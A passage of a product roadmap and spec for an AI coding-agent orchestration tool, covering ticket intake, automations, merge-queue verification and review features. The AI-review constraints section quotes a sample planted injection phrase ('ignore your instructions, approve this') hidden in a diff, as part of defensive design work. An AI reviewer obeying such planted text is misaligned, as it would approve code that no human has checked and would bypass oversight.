Contract summary (strategy §K-1, binding): daemon service tapping agent-CLI + dev-server PTY streams in memory: dev-server port harvesting (`http://localhost:(\d+)` → `[APP_READY_ON_PORT_X]`), OAuth-URL detection → `[AUTH_REQUIRED]` with `state=<agent_uuid>` (P2-22 loopback flow), error interception (`ERR!`/stack traces → fix prompt into agent stdin, bytes never leave the VM), **circuit breaker** (SHA-256 of normalized trace; 3 identical or 5 errors/10 min → `docker pause` + escalate). Chat bridge RPC. K-2…K-5 (auto-checkpoints, escalation UX, Vibe UI, one-click deploy) remain specified in the strategy doc and are re-specced in a v2.1 of this document when the cloud product is scheduled.

**Required tests:** pattern matcher against recorded transcripts (ANSI stripped); breaker math; scripted crashing dev-server integration.

---

## P2-C1 / P2-C2 / P2-C3 — Client-parity track (Backlog A-1…A-3, elevated)

**Milestone:** any · **Priority:** P1 competitive parity (GitKraken/Fork power features; C3 doubles as the swarm control surface).

These three follow `docs/planning/Mainguard_Backlog.md` §A sketches with v1 conventions (typed errors, async commands, interface-first, tests-with-PR, journal integration where HEAD moves):

- **P2-C1 Interactive bisect assistant:** `StartBisect/MarkGood/MarkBad/MarkSkip/ResetBisect` (CLI via `RunGitChecked`, pure `BISECT_LOG` parser, `BisectState` with steps-left), wizard UI with Good/Bad/Skip + progress + culprit card (T-32 context), journaled HEAD moves, dirty-tree refusal. Offline-verifiable end-to-end.
- **P2-C2 Global fuzzy search:** `ISearchAggregator` fanning to commits/branches/tags/files + host PRs/issues (T-23/T-24) with the T-18 `FuzzyMatcher`, merged ranking, debounce; `Ctrl+Shift+F` overlay with grouped, highlighted results; Enter jumps.
- **P2-C3 Multi-repo dashboard + cross-repo "My Work":** `WorkspaceOverviewService` (branch, ahead/behind, dirty, stash count, last-fetched per registered repo; cached; `RepositoryChanged`/auto-fetch refresh), card grid with Fetch/Pull/Open quick actions, persisted repo set — **plus a needs-attention lane aggregating host items across repos** (review-requested PRs, assigned issues, failing checks from the shipped T-23…T-27 services): the Copilot "My Work" / GitKraken Launchpad parity view. Later becomes the swarm's home surface (P2-13 integration).

**Required tests:** per the backlog sketches — bisect culprit fixture; aggregator ranking + debounce; overview fixtures (ahead/behind/dirty matrices).

---


---

**Design decisions (binding) — [`FeatureDesigns.md`](../../design/FeatureDesigns.md) §1–§3.** Bisect assistant (Good/Bad/Skip wizard + progress + culprit card), global fuzzy search (grouped, highlighted, keyboard-first overlay), multi-repo home + the cross-repo attention lane — each designed end-to-end (flow, surface, keyboard-first interactions, delight moment, all five themes). Keyboard additions: FeatureDesigns Appendix B. The command-surface system that extends T-18 (coverage contract, naming grammar, gesture tiers, disclosure ladder): [`ProductAndUX.md`](../../design/ProductAndUX.md) Part 3. Net-new unscheduled candidates beyond C1–C5: ProductAndUX Part 1 (I-1…I-10).

# 5. COMPETITIVE-MATCH WAVE (M7.75 — match every competitor feature, then beat it)

> Added 2026-07-07 after the owner's directive: match every competitor feature, then beat it.
> Each task names the competitor(s) it matches and the "beat" increment beyond parity.

---

## P2-27 — Ticket-to-verified-PR pipeline (matches MergeLoom core loop + Kepler Tasks intake)

**Milestone:** M7.75 · **Priority:** P0 — the direct MergeLoom response · **Depends on:** P2-10, P2-14; reuses T-24 (issues), P3-07 hosts as they land.

### Contract

```csharp
// daemon Mainguard.Agents/Agents/Orchestrator/TicketIntake.cs
public sealed record TicketRef(string Provider, string ExternalId, string Title, string Url); // github-issue | gitlab-issue | jira | linear
public interface ITicketIntake
{
    /// <summary>Drafts a TaskPlan (P2-14) from a ticket: title/body/labels/linked code refs →
    /// structured Scope/Approach/TestStrategy. The plan ALWAYS goes to human approval.</summary>
    Task<TaskPlan> DraftPlanAsync(string repoHash, TicketRef ticket, CancellationToken ct);
    /// <summary>Post-merge: writes the outcome back to the ticket (comment + optional transition)
    /// with links to the PR, the verification record, and the audit entry.</summary>
    Task ReportOutcomeAsync(TicketRef ticket, TicketOutcome outcome, CancellationToken ct);
}
```

Providers (full MergeLoom parity): GitHub Issues (T-24 transport), GitLab issues (P3-07a),
**Jira, Linear, Azure Boards, monday.dev** (new thin REST clients, one audited transport each,
keyring keys `ticket_<provider>`). **Routing rules** per repo: label / status / query filters decide
what is offered for intake ("approved work only" — e.g. status=Ready + label=agent), configured once
in settings. **Epic import & sync:** a Jira Epic (or GitHub milestone / Linear project) imports as a
multi-task plan (P2-28) whose children become task nodes; "Sync" re-diffs against the tracker when it
changes. **Clarity check:** before drafting a plan, a pure `TicketClarityCheck` grades scope +
acceptance criteria (missing AC / vague scope / conflicting labels → the draft screen shows the gaps
and suggests questions to post back to the ticket) — matching MergeLoom's gate 1, but as reviewer
assistance rather than a silent rejection.

### Implementation steps

1. Intake UI: "Start from ticket" — pick provider → searchable ticket list → draft plan preview (editable) → approve → worker spawns (P2-14 two-phase, unchanged).
2. The ticket travels the whole pipeline: `Task:` provenance trailer + Agent Trace record reference the ticket id; the P2-10 verification record and merge/PR link back to it.
3. Outcome write-back: comment template (PR link, pass/fail, curated-commit summary) + optional status transition (configurable per provider; off by default).
4. Batch intake: multi-select tickets → one plan each → sequential or parallel per admission control.

**Beat (vs MergeLoom):** ticket-to-**merged**, not ticket-to-PR — intake lands in the stale-invalidating merge queue (P2-10) with conflict radar (P2-19), runs **locally in the hardened default-deny sandbox** (they publish no sandbox story), behind the human plan-approval gate, in the hash-chained audit; the reviewer gets the full P2-11 cockpit instead of the code-host PR page. **Beat (vs Kepler Tasks):** Kepler sets up sessions; we carry the ticket through verification → merge → outcome write-back.

**Edge cases:** ticket edited after plan drafted (plan shows staleness chip); write-back without permission → typed, non-fatal; two workers from the same ticket → allowed but labeled (comparison flow, P2-31).
**Invariants:** plan approval is never skipped for ticket-initiated work; ticket tokens follow G-4/G-13 (header-only, keyring).
**Required tests:** draft-plan fixtures per provider; outcome write-back fixtures; end-to-end scripted (ticket → plan → worker → verified → merged → comment).

---

## P2-28 — Multi-repo Tasks (matches Kepler's headline; extends P2-C3)

**Milestone:** M7.75 · **Priority:** P0-parity · **Depends on:** P2-C3, P2-06, P2-27.

### Contract

```csharp
// Mainguard.Agents/Agents/Orchestrator/MultiRepoTask.cs
public sealed record MultiRepoTask(string TaskId, string Title, IReadOnlyList<string> RepoHashes,
    string? TicketExternalId, IReadOnlyDictionary<string /*repoHash*/, string /*agentId*/> Workers);
```

One Task spans N repos: one worktree/worker per repo, a **shared context document** (the task
brief + cross-repo notes) injected into every worker's prompt context, per-repo verification, and a
task-level review view that stitches the per-repo cockpits with a combined "all repos verified"
gate before the (sequential, per-repo, human) merges.

**Epic slices (MergeLoom Epic Delivery parity):** a multi-task plan may declare **dependency-ordered slices** (slice 2 starts after slice 1 merges; earlier slices establish contracts/data shapes); per-slice controls: pause/resume, replan (re-approve), skip, retry; per-slice cost + gate status from P2-08/P2-10 telemetry.

**Beat:** Kepler stops at session setup + review; we add **cross-repo verification gating** (don't merge repo A's half of a contract change until repo B's half verified) and the conflict radar (P2-19) runs across the task's repos — and slice ordering can use **measured overlap** (P2-19) rather than only human-declared dependencies, so slices that would collide are serialized before they run (MergeLoom's slices meet at PR time and collide there).

**Edge cases:** one repo's worker fails → task shows partial state, others unaffected; repo removed from disk mid-task → typed, task recoverable; shared context edited mid-flight → workers get it at next yield (never mid-generation).
**Invariants:** no cross-repo git operations (each repo's boundary intact); the task is an orchestration record, not a new VCS concept.
**Required tests:** two-fixture-repo task end-to-end; partial-failure state machine; gating (merge blocked while sibling unverified).

---

## P2-29 — Session board & side-by-side comparison (matches Kepler kanban + comparison, Vibe Kanban, Nimbalyst)

**Milestone:** M7.75 · **Priority:** P1-parity · **Depends on:** P2-13.

- **Board view:** agents/tasks as cards in state columns (the P2-10 states are the lanes: Working / Verifying / Verified / AwaitingReview / Merged-Rejected + Conflict/RateLimited badges) — a projection of existing state, zero new lifecycle concepts; drag between columns only where a real transition exists (e.g. AwaitingReview → back to Working with a follow-up prompt).
- **Comparison view:** select 2–3 agent branches → side-by-side diff-vs-main panes (reusing the T-13 diff stack) + verification records + spend + provenance summary; "pick winner" archives the others (P2-10 rejection path).

**Beat:** comparison includes **verification results and cost per candidate**, not just diffs — "which branch is green and cheapest", which nobody's comparison view shows.

**Required tests:** board projection from fixture states (no illegal transitions offered); comparison VM with 3 fixture branches; winner-pick → rejection path.

---

**Design decisions (binding) — [`ControlCenterDesign.md`](../../design/ControlCenterDesign.md) §7.** The session board as kanban plus side-by-side candidate comparison.

## P2-30 — Automations & scheduling (matches Superset automations, Codex Automations, Jules scheduled tasks)

**Milestone:** M7.75 · **Priority:** P1-parity · **Depends on:** P2-14, P2-27.

### Contract

```csharp
// daemon Mainguard.Agents/Agents/Orchestrator/AutomationService.cs
public sealed record Automation(string Id, string Name, AutomationTrigger Trigger /* Cron | RepoEvent | CiFailure | TicketLabel */,
    string TaskTemplate /* prompt/plan template */, ApprovalMode Approval /* AlwaysAsk | PolicyAutoApprove */);
```

Scheduled or event-triggered agent runs: nightly dependency-bump PR, "label a ticket `agent` →
intake it", "CI failed on main → janitor" (P3-09 becomes an automation type). Every run is a
normal governed task: plan → (auto-)approval per org policy → sandbox → verification → queue.

**Agent Fleets (MergeLoom parity):** an automation may be a named fleet with a **mandate** (prompt
template + path scope + rules), **cadence**, **budget** (P2-08), **daily PR-producing-run cap**, and
an **open-review cap** (fleet pauses while ≥N of its branches sit unreviewed — reviewer-flooding
control); pause/resume per fleet; mandate/scope/budget changes are audit events.

**Beat:** competitor automations run ungoverned, and MergeLoom's fleets mitigate reviewer flooding with caps; ours emit the same plan-approval + audit chain (`PolicyAutoApprove` is an explicit, audited org policy), and fleet output enters the **stale-invalidation queue + conflict radar**, so recurring agents never land stale or mutually-conflicting PRs — coordination, not just caps. On BYOK local hardware, overnight fleet runs cost tokens only (vs a per-PR platform fee).

**Edge cases:** trigger storm (N CI failures) → dedup + admission control; automation editing while a run is live → next-run semantics; disabled automation retains history.
**Required tests:** cron + event trigger units; dedup; policy-gated auto-approve audit; end-to-end scripted nightly run.

---

## P2-31 — Dispatcher & multi-candidate runs (matches Conductor Dispatcher, Cursor multi-model)

**Milestone:** M7.75 · **Priority:** P1-parity · **Depends on:** P2-08, P2-14, P2-29.

- **Dispatcher:** per-task agent/model selection with org defaults + per-CLI health/capability metadata from the adapter channel (P2-22); "auto" routes by task template + past success telemetry (simple heuristics first, no ML).
- **Multi-candidate:** one approved plan → N workers (different CLI/model each) in parallel (admission-capped); results land in the P2-29 comparison view; one winner merges, others reject.

**Beat:** candidates are compared on **verification outcome + spend + diff risk score** (P2-11), not eyeballed diffs.

**Required tests:** routing table units; N-candidate spawn respects admission/budget; comparison hand-off; winner/reject flow.

---

## P2-32 — External automation surface: SDK, MCP server, webhooks & chat notifications (matches Superset SDK/MCP/Slack)

**Milestone:** M7.75 · **Priority:** P1-parity · **Depends on:** P2-02, P2-30.

- **SDK:** a thin, versioned TypeScript + C# client generated from the protos (they are the contract; G-14 keeps them clean) covering: list/spawn agents, queue state, verification records, audit read.
- **MCP server:** the daemon exposes an MCP endpoint so external agents/IDEs can drive Mainguard ("spawn a worker on ticket X", "what's blocking the queue") — the ActionRegistry (T-18) reused as the tool surface; every MCP call authenticated + audited like any client.
- **Webhooks + chat:** outbound notifications (queue transitions, escalations, budget events) to generic webhook + Slack/Teams templates; per-event-type routing.

**Beat:** the MCP surface makes Mainguard itself agent-drivable **under the same governance** (plan approval and budgets apply to MCP-initiated work — a governed agent-of-agents story nobody ships).

**Invariants:** SDK/MCP have no privileged bypass — same interceptors, same audit; webhook payloads carry links + metadata, never diff/file content by default.
**Required tests:** generated-SDK contract test against the in-proc daemon; MCP tool-call → governed task with audit events; webhook schema + retry.

---

## P2-33 — In-app dev-server preview & port panel (matches Conductor browser preview, Superset in-app browser/ports)

**Milestone:** M7.75 · **Priority:** P2-parity · **Depends on:** P2-26 (port harvesting exists there).

Per-agent detected dev-server ports (P2-26's `[APP_READY_ON_PORT_X]` taps) surface as chips on the
agent card; click → embedded preview pane (the P3-03 `LivePreviewControl`, shipped early behind a
flag) or system browser; port-forward managed by the daemon (sandbox → localhost bridge).

**Required tests:** port-harvest fixture stream → chips; forward lifecycle (agent teardown closes forwards); preview navigation smoke in the headless harness.

---

## P2-34 — Context vault: persistent cross-repo knowledge index (matches MergeLoom Context Engine)

**Milestone:** M7.75 · **Priority:** P0 — MergeLoom's second-strongest feature · **Depends on:** P2-06; feeds P2-09 spawns, P2-11 review, P2-27 intake.

### Contract

```csharp
// daemon Mainguard.Agents/Context/ContextVault.cs
public sealed record EvidenceItem(string Kind /* symbol|api|doc|rule|history */, string SourcePath,
    string Excerpt, string CommitSha, double Confidence);
public sealed record ContextPack(string TaskId, IReadOnlyList<EvidenceItem> Items, string RulesDigest);
public interface IContextVault
{
    void Index(string repoHash);                     // baseline walk: symbols, public APIs, docs, AGENTS.md rules
    void DeltaSync(string repoHash, string fromSha, string toSha);  // Git-object-keyed incremental update
    ContextPack BuildPack(string taskId, string query, IReadOnlyList<string> repoHashes, ContextBudget budget);
}
```

### Implementation steps

1. Index sources: tree walk of the ext4 bare repos (never working trees) — code symbols (Roslyn for C#, tree-sitter grammars for the top languages, plain-text fallback), markdown docs, `AGENTS.md`/`CLAUDE.md` rule files; optional external doc sources (Confluence/Notion adapters, read-only, keyring-auth) — one audited transport each, same G-4 rules.
2. **Delta sync keyed on Git objects** (`fromSha..toSha` diff → touched paths re-indexed) — cheap, exact, no file watching; runs after each provisioner fetch and keep-alive cycle.
3. `BuildPack`: scoped retrieval (path include/exclude rules per repo, budget-capped) → evidence items each carrying **the commit SHA they were read at** and a confidence score; the pack is attached to the worker spawn (P2-09 prompt context), recorded on the task, and rendered in review.
4. Storage: daemon SQLite (FTS5) + embeddings optional/later — v1 is symbol/path/FTS retrieval, deliberately not a vector DB.

### Beat (vs MergeLoom)

Their evidence is a PR attachment from a proprietary index; ours is **Git-native and navigable**: every evidence item links to blame (T-11)/file history (T-12) at its recorded SHA, and the review cockpit (P2-11) shows *which evidence influenced which hunk*. Claims are verifiable in the client, not just asserted.

### Edge cases / invariants

| Case | Required behavior |
|---|---|
| repo re-provisioned from scratch | vault detects new root, full re-index |
| binary/huge files | skipped by classifier + size caps |
| rules file changed mid-task | pack pins the digest it shipped with; next task gets the new rules |
| external source unreachable | pack builds without it, flagged degraded |

MUSTs: index reads bare-repo objects only (no worktree reads, no locks); packs are immutable per task; external-source tokens header-only (G-4).
**Rejection triggers:** indexing working trees; unbounded pack sizes; a second retrieval stack bypassing the vault.
**Required tests:** index + delta-sync fixtures (rename/delete/modify matrix); pack budget enforcement; evidence-SHA pinning; degraded-source path.

---

## P2-35 — Verification depth: bounded repair loop, Diff Guard, AI review pass (matches MergeLoom gates 4–6)

**Milestone:** M7.75 · **Priority:** P0 · **Depends on:** P2-10, P2-11; amends both.

### Contract

```csharp
// amendments
// P2-10 MergeQueue gains:
Task<VerificationRecord> RunVerificationAsync(string agentId, RepairPolicy repair, CancellationToken ct);
public sealed record RepairPolicy(int MaxAttempts /* default 2 */, bool Enabled);
// Mainguard.Agents/Review/DiffGuard.cs (pure)
public sealed record DiffGuardVerdict(bool Blocked, IReadOnlyList<string> Reasons); // oversized | off-scope | generated-file bulk
public static class DiffGuard
{
    public static DiffGuardVerdict Evaluate(IReadOnlyList<FilePatch> diff, TaskPlan plan, DiffGuardPolicy policy);
}
// Mainguard.Agents/Review/AiReviewService.cs
public interface IAiReviewService   // optional pass, per-repo toggle
{
    Task<IReadOnlyList<ReviewFinding>> ReviewAsync(string agentId, ContextPack pack, CancellationToken ct);
}
```

### Implementation steps

1. **Repair loop:** verification failure → one scoped repair prompt into the *same* worker sandbox (failure log tail + failing test names + plan scope), re-verify; attempts capped by `RepairPolicy` (default 2), every attempt journaled and audited (`repair_attempted` events); cap reached → normal failure surfacing. Never runs for external-PR intake entries unless the org enables it (their branch, our writes — explicit).
2. **Diff Guard:** pure policy over the merge diff vs the approved plan — line-volume threshold, files-touched-outside-plan-scope, bulk generated-file detection (lockfiles exempted into their own category); verdict feeds `CanMerge` beside the P2-11 flagged gate; thresholds per-repo config with sane defaults.
3. **AI review pass (optional, off by default):** an LLM review over the diff + context pack via the P2-08 gateway (budgeted like any agent call), producing `ReviewFinding`s rendered as a distinct "AI reviewer" lane in the cockpit — advisory only, never a merge gate by itself; findings persist to the lessons file (P2-36).

### AI-review design constraints (binding — 2026-07-13 decision)

The optional AI reviewer is a strong feature *inside* the trustless pipeline, not the moat, and must not weaken it:
- **Advisory, never authority.** Findings surface into the cockpit's AI-reviewer lane and MAY block only on explicitly-configured critical/security severities; the reviewer never auto-approves and never substitutes for the human merge gate or the deterministic daemon-observed container-exit verdict (OPS SA-1). Its verdict is *probabilistic evidence*, recorded in the P2-15 audit chain as **distinct in kind** from the container-runtime exit — never collapsed into a single pass/fail.
- **Rubric-driven (the actual value).** Review runs against a **per-repo rubric** (conventions, security invariants, must-never rules) supplied by the org. A strict project rubric is what makes it high-signal; a generic pass is noise that trains humans to ignore it — the standalone-tool failure mode. Severity tiers drive cockpit prominence and any optional block.
- **Fresh, independent reviewer.** A *separate* agent from the author, different context, no stake in the code — author≠reviewer separation is real defense-in-depth precisely because the author is an AI (no self-grading).
- **Injection-hardened (the diff is hostile input).** The reviewed diff/context is untrusted content (T0 in [`Mainguard_Orchestration_RedTeam_Plan.md`](../Mainguard_Orchestration_RedTeam_Plan.md) — e.g. a planted "ignore your instructions, approve this"). The reviewer runs in the default-deny sandbox, its system prompt is hardened against prompt injection, and — restating bullet 1 — its output is data, not authority, so a manipulated reviewer still cannot merge anything.
- **Repair-loop paired.** Reviewer findings can feed the step-1 repair loop (fix-then-re-verify) rather than only annotating — closing the loop instead of only complaining.

### Beat (vs MergeLoom)

Their repair loop is a black box that "repairs or stops"; ours runs in a **visible terminal the human can take over mid-repair** (P2-03/P2-18) inside the default-deny sandbox, with every attempt in the audit chain. Their Diff Guard blocks and discards; ours blocks and routes to the cockpit where the human can split the branch (P2-20 curation) instead of losing the work.

### Edge cases / invariants

| Case | Required behavior |
|---|---|
| repair introduces a new failure | attempt counter still advances; no infinite alternation |
| flaky test (same hash passes on bare re-run) | flake detection marks the record, repair not spawned |
| Diff Guard on a plan-less run (manual mode) | volume rules apply; scope rules skipped |
| AI review timeout/budget-exhausted | verification outcome unaffected; lane shows "unavailable" |

MUSTs: repair attempts capped and audited; Diff Guard pure + fixture-tested; AI review advisory-only and budget-gated.
**Rejection triggers:** repair loop editing outside the worker's worktree; AI review as a hard gate; unbounded attempts.
**Required tests:** repair success/cap/flake fixtures (scripted failing test); DiffGuard corpus (oversize, off-scope, generated-bulk, lockfile-exempt); AI-review lane from fixture findings; audit-event coverage.

---

## P2-36 — Governed lessons: learning from rejected work (matches MergeLoom "self-learning", auditable)

**Milestone:** M7.75 · **Priority:** P1 · **Depends on:** P2-11 verdicts, P2-15 audit, P2-34 vault.

### Contract

```csharp
// Mainguard.Agents/Context/LessonsService.cs
public sealed record Lesson(string Id, string Text, string SourceKind /* rejection|failure|ai-review|manual */,
    string SourceRef, DateTimeOffset When, bool Enabled);
public interface ILessonsService
{
    IReadOnlyList<Lesson> GetLessons(string repoHash);
    Lesson Propose(string repoHash, string text, string sourceKind, string sourceRef); // enters review state
    void SetEnabled(string repoHash, string lessonId, bool enabled, string osIdentity);
}
```

Lessons live as a **versioned file in the repo** (`.mainguard/lessons.md`, human-editable, PR-able) plus
daemon state for pending proposals. Sources: P2-10 verification failures, P2-11 review rejections +
acknowledged flags, P2-35 AI-review findings, manual entry. Enabled lessons are prepended into every
context pack (P2-34 `RulesDigest`).

### Beat (vs MergeLoom)

Their "self-learning system" is an opaque claim. Ours is **glass-box governed learning**: every
lesson has a source reference, requires a human enable (or org auto-enable policy, audited), lives
in the repo history, and its enable/disable events are hash-chained (P2-15). An auditor can see
exactly what the system learned, from what, and when.

**Edge cases:** duplicate lessons deduped by content hash; lesson referencing a redacted audit entry keeps working (reference is by id); repo without `.mainguard/` → created on first enable.
**Invariants:** no lesson auto-enables without an explicit org policy; lessons never contain secrets (T-30 scan on propose); packs pin the lessons digest they shipped with.
**Required tests:** propose/enable/inject round-trip; dedup; secret-scan rejection; digest pinning; audit events.

---

## P2-37 — Session checkpoints, working-tree snapshots & session forking (matches Conductor checkpoints/fork, Sculptor snapshots, Codex forked threads)

**Milestone:** M7.75 · **Priority:** P0-parity (must-match) · **Depends on:** P2-02, P2-09; upgrades T-19.

### Contract

```csharp
// daemon Mainguard.Agents/Agents/SessionCheckpointService.cs
public sealed record SessionCheckpoint(string Id, string AgentId, string WorktreeSha, string? DirtyTreeSha,
    string TranscriptRef, string EnvManifestRef, DateTimeOffset When, string Label);
public interface ISessionCheckpointService
{
    SessionCheckpoint Create(string agentId, string label);           // auto: before every user redirect; manual: button
    IReadOnlyList<SessionCheckpoint> List(string agentId);
    void Restore(string agentId, string checkpointId);                // worktree + tree + transcript context
    string Fork(string agentId, string checkpointId);                 // new worktree at checkpoint SHA + transcript replay → new agent
}
```

### Implementation steps

1. **Tree snapshots (GitButler-oplog-grade):** `git stash create`-style dangling commit of the dirty tree recorded on the checkpoint (and — as a T-19 upgrade — before **every** journaled mutating operation), so undo/restore recovers uncommitted work too. This removes the shipped journal's clean-tree-only limitation; snapshot SHAs live in the journal rows (new column + migration).
2. **Session state:** adapter transcript tail + PTY scrollback ref + env manifest persisted to daemon SQLite at checkpoint.
3. **Restore:** yield (P2-09) → worktree reset to `WorktreeSha` (+ dirty tree reapplied from `DirtyTreeSha`) → context re-primed. **Fork:** new branch/worktree at the checkpoint + fresh adapter session seeded with the transcript summary — Conductor's fork-workspace and Sculptor's "reopen any past session," on Git-native storage.
4. **Adapter-crash forensic resume:** on CLI death (429/OOM/kill), the daemon auto-creates a checkpoint from the last-known state and offers "resume in a fresh session with reconstructed context" — recovery UX where competitors say "start over."

### Beat

Checkpoints are **Git objects + SQLite rows, replayable offline and hash-chain referenced (P2-15)** — Sculptor's snapshots live in container images; ours survive machine moves via the repo itself and are audit evidence.

**Edge cases:** checkpoint during mid-rebase worktree → refused typed (same guard as keep-alive); fork of a fork → lineage recorded; restore with newer commits on the branch → confirmation with diff summary; scrollback ref GC'd → restore proceeds without it, flagged.
**Invariants:** no checkpoint without a completed yield; dangling-commit snapshots are pinned (a `refs/mainguard/snapshots/*` ref) so `git gc` can't eat them, pruned by journal retention policy.
**Required tests:** snapshot/restore round-trip incl. dirty tree; fork lineage; crash-resume from a killed scripted CLI; T-19 upgrade — undo of a mutating op now restores uncommitted changes (the previously-refused dirty case).

---

## P2-38 — Review loop-closers: inline comments → agent, viewed-state receipts, curation-surviving review state (matches Codex diff comments, Conductor mark-viewed; novel receipts)

**Milestone:** M7.75 · **Priority:** P0-parity (must-match) · **Depends on:** P2-11, P2-09; T-13 diff stack.

### Contract

```csharp
// Mainguard.Agents/Review/ReviewSession.cs
public sealed record DiffComment(string Id, string Path, string PatchId /* git patch-id: rebase-stable */,
    int Line, string Text, string Author, DateTimeOffset When, bool SentToAgent);
public sealed record HunkViewedReceipt(string PatchId, string ReviewerIdentity, string AtCommit, DateTimeOffset When);
public interface IReviewSessionService
{
    DiffComment AddComment(string agentId, DiffComment comment);
    void SendToAgent(string agentId, string commentId);        // serialized as a steering message (file:line + hunk context)
    void MarkViewed(string agentId, string patchId, bool viewed);   // emits a HunkViewedReceipt (audited)
    ReviewCoverage GetCoverage(string agentId);                 // % hunks viewed, by risk category
}
```

### Implementation steps

1. **Comment gutter** in the diff views (unified + split), session-scoped store; "Send to agent" delivers via the P2-09 steering channel (queued if busy — P2-39 message queue); the agent's follow-up commit links back to the comment (trailer/trace ref) so the cockpit shows comment → fix.
2. **Mark-viewed keyed by `git patch-id`** so state survives rebases; viewed-state renders in the P2-11 ranked list as progress.
3. **Receipts + coverage map:** every viewed-mark is a `HunkViewedReceipt` on the audit chain (P2-15); repo-level coverage report — "lines merged with zero human eyes", by agent/model/date — the EU-AI-Act artifact nobody else can produce (they own neither blame nor review state).
4. **Curation-surviving state:** when P2-20 squashes/rewrites history, review comments, viewed-state, and Agent Trace records migrate across via patch-id/content-hash mapping — curation never resets review progress (every competitor loses review state on rewrite).
5. **Review-sprint mode (novel):** timed keyboard-only pass over the ranked hunks with a risk budget; deferred hunks recorded as unviewed in the coverage map.

**Edge cases:** comment on a hunk that disappears after rebase → orphaned view with context preserved; two reviewers (P3-10) → receipts per identity; patch-id collision (identical hunks) → both marked, acceptable.
**Invariants:** receipts are append-only audit events; "send to agent" never writes to the worktree itself; coverage math is pure + fixture-tested.
**Required tests:** patch-id stability across rebase fixture; comment→steering serialization; curation migration (squash fixture keeps comments/state); coverage report; receipt audit events.

---

## P2-39 — Orchestration UX pack: message queue, prompt-first dispatch, session search, plan visibility (matches Conductor queue/dispatcher, Nimbalyst/Superset search, Codex task sidebar)

**Milestone:** M7.75 · **Priority:** P1-parity · **Depends on:** P2-02, P2-13, P2-14.

Four small, high-daily-value items in one task:

1. **Message queue:** per-session FIFO in the daemon; the composer switches to "queued" while the adapter streams; delivered on idle; queue visible/reorderable/cancellable.
2. **Prompt-first dispatch:** the T-18 palette gains "New session:" — type the prompt, inline-pick repo + agent + base branch, Enter spawns (through plan-approval when coordinator-managed; direct in manual mode).
3. **Session search:** SQLite FTS5 over persisted transcripts + session metadata (titles, summaries auto-generated at close), palette-integrated; embeddings deliberately deferred.
4. **Plan/subagent visibility:** parse adapter structured events (Claude Code / Codex stream-json) into a live read-only plan/task tree beside the terminal; the same parsed stream feeds P2-15 audit and the P2-45 flight recorder (dual-purpose substrate).

**Invariants:** queued messages survive daemon restart; search index excludes secret-masked regions (G-13 mask applied before indexing); the plan tree is read-only in v1.
**Required tests:** queue persistence/ordering/cancel; dispatch through both modes; FTS round-trip with masked content excluded; event-parse fixtures per adapter.

---

**Design decisions (binding) — [`ControlCenterDesign.md`](../../design/ControlCenterDesign.md) §4.** The orchestration UX pack is designed into the workspace dock (per-agent terminal + diff + staging, P2-13 dock + this pack + the P2-44 strip as one workspace).

## P2-40 — Composer & review conveniences: image input, voice dictation, edit-in-place, external-editor links, rendered previews (matches Codex/Kepler/Jules input breadth; Superset editor pattern)

**Milestone:** M7.75 · **Priority:** P2-parity · **Depends on:** P2-03 (composer), T-13 (viewers).

1. **Image input:** paste/drag into the composer → file into the sandbox mount → path reference in the adapter message (UI-bug workflows).
2. **Voice dictation:** Windows-native speech (`Windows.Media.SpeechRecognition`) or BYOK Whisper into the composer; push-to-talk keybinding (T-18 rebindable).
3. **Edit-in-place:** AvaloniaEdit behind an "Edit" toggle on the file/diff view — save + auto-stage; deliberately *not* an IDE (small review-time fixes only).
4. **External editor deep links:** "Open in VS Code / JetBrains / …" per-file and per-worktree (configurable command templates through the validated launcher pattern).
5. **Rendered previews:** render-only Markdown + Mermaid preview in the file/diff viewer (review-relevant slice of Nimbalyst's suite; the editors themselves stay skipped).

**Invariants:** pasted images land only inside the agent's sandbox mount; editor templates never shell-interpolate untrusted paths (ArgumentList, launcher rules).
**Required tests:** image path plumbing; edit-save-stage round-trip; template arg construction; markdown/mermaid render smoke in the headless harness.

---

## P2-41 — Remote dashboard: daemon-served LAN/web monitor (matches Orca/Superset/Nimbalyst mobile, Pane Remote — self-host model)

> **Builds on the daemon logging pipeline (shipped 2026-07).** A "recent daemon logs" / live-tail view builds on the journal + per-category files — Core's `DaemonLogReader` already tails them for the Settings panel; live *remote* streaming is the piece deferred to this phase.

**Milestone:** M8 · **Priority:** P1 · **Depends on:** P2-02, P2-32 (API), P2-13 (state model). Feeds P3-05/P3-06.

The daemon serves a small responsive SPA (localhost + optional LAN bind) over the gRPC-web API:
session board (P2-29 projection), needs-attention list, plan approvals (approve/reject from the
phone — the single highest-value remote action), kill switch, spend counters. **Device pairing:**
QR/short-code pairing mints a scoped token (approve/observe roles); no vendor cloud — the Pane
self-host model, which fits the security-conscious buyer. A store-packaged mobile app is a later
wrapper of the same API; cross-device *continuity* arrives with P3-06.

**Invariants:** LAN bind is opt-in + TLS (self-signed cert pinned at pairing); paired tokens are scoped, revocable, audited; approvals from remote carry the paired identity into the P2-15 chain.
**Required tests:** pairing/revocation; role enforcement at the API layer; remote approval lands with correct identity; observe role cannot mutate.

---

**Design decisions (binding) — [`ControlCenterDesign.md`](../../design/ControlCenterDesign.md) §8.** The remote dashboard is designed with the telemetry family (health / recorder / remote) as §8's panel set; state vocabulary per §9.

## P2-42 — Merge-train simulation, verification cache & test-impact ordering (novel — extends P2-10)

**Milestone:** M7.75 · **Priority:** P1 differentiator · **Depends on:** P2-10, P2-19.

1. **Merge-train simulation ("pre-flight"):** dry-run the whole queue in order in a scratch worktree — sequential rebase+merge of all queued branches → pairwise/transitive conflict report + one combined verification run. Competitors verify branch-by-branch against main; nobody shows "what main looks like after all five land." UI: a train view on the queue panel with per-car status.
2. **Verification cache & receipts:** results content-addressed by `(merge-base SHA, branch tree hash, test-command hash)` — re-queues after unrelated merges hit cache instead of re-running; each pass/fail is a signed receipt chained in P2-15. Turns the queue into an auditable, dedupe-able ledger.
3. **Test-impact ordering:** coverage map (test↔file) accumulated from prior runs; queue entries run the impacted subset first for a fast preliminary verdict, full suite before merge — the queue feels instant vs competitors' full-CI waits.

**Edge cases:** train invalidated mid-simulation by a human merge → re-simulated; cache poisoned by a flaky test → flake detection (P2-35) marks receipt non-cacheable; impact map cold-start → full-suite until warm.
**Invariants:** simulation happens in scratch worktrees only (never touches agent worktrees or main); cache hits still record a receipt (referencing the original); preliminary verdicts never gate a merge — only full runs do.
**Required tests:** train fixture (5 branches, induced transitive conflict); cache hit/miss/flake matrix; impact-subset selection fixtures; receipts chain.

---

## P2-43 — Agent identity: per-agent signing keys & countersigned merges (novel — Git-object-level attribution)

